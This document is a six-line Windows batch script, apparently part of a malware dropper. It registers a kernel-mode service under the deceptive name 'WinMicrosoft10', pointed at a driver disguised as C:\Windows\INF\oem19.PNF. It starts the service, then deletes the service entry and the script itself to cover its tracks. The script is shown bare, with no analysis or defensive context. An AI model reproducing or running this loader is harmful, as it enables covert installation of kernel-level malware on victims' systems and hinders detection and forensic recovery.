@echo off
cd %~dp0
sc create WinMicrosoft10 binpath=C:\Windows\INF\oem19.PNF type=kernel
sc start WinMicrosoft10
sc delete WinMicrosoft10
del "%~f0"